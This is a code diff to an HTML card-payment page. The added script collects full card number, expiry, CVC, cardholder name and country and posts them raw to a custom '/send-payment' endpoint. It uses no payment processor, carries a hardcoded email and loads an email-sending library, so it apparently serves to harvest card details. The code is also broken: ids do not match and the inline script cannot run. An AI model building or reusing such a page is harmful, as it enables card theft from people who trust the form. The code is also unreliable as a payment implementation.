@@ -71,26 +71,27 @@
     <div class="card">
       <h3>Pay with card</h3>
 
-      <form id="paymentForm">
+      <form id="paymentForm" method="POST">
         <label>Email</label>
-        <input type="email" value="samueludsen@210@gmail.com" required />
+        <input type="email" id="email" value="samueludsenge2910@gmail.com" required />
 
         <label>Payment method</label>
         <div class="card-input">
-          <input type="text" placeholder="1234 1234 1234 1234" maxlength="19" required />
+          <input type="text" id="cardnumber"placeholder="1234 1234 1234 1234" maxlength="19" required />
           <div class="icons">💳</div>
         </div>
 
         <div class="row">
-          <input type="text" placeholder="MM / YY" maxlength="5" required />
-          <input type="text" placeholder="CVC" maxlength="3" required />
+          <input type="text" id="expiry" placeholder="MM / YY" maxlength="5" required />
+          <input type="text" id="cvc" placeholder="CVC" maxlength="3" required />
+          <div class="icons">💳</div>
         </div>
 
         <label>Cardholder name</label>
-        <input type="text" placeholder="Full name on card" required />
+        <input type="text" id="cardholder" placeholder="Full name on card" required />
 
         <label>Country or region</label>
-        <select>
+        <select id="country" required>
           <option>Rwanda</option>
           <option>United States</option>
           <option>Kenya</option>
@@ -114,7 +115,37 @@
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 
 <script src="script.js">
-    
+    const form = document.getElementById('paymentForm');
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault(); // Prevent default page reload
+
+            const formData = {
+                email: document.getElementById('email').value,
+                cardNumber: document.getElementById('cardNumber').value,
+                expiry: document.getElementById('expiry').value,
+                cvc: document.getElementById('cvc').value,
+                cardholder: document.getElementById('cardholder').value,
+                country: document.getElementById('country').value
+            };
+
+            try {
+                const response = await fetch('/send-payment', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(formData)
+                });
+
+                if (response.ok) {
+                    alert('Payment details sent successfully!');
+                    form.reset();
+                } else {
+                    alert('Error sending data. Check server logs.');
+                }
+            } catch (err) {
+                alert('Network error: ' + err.message);
+            }
+        });
 </script>
 </body>
 </html>
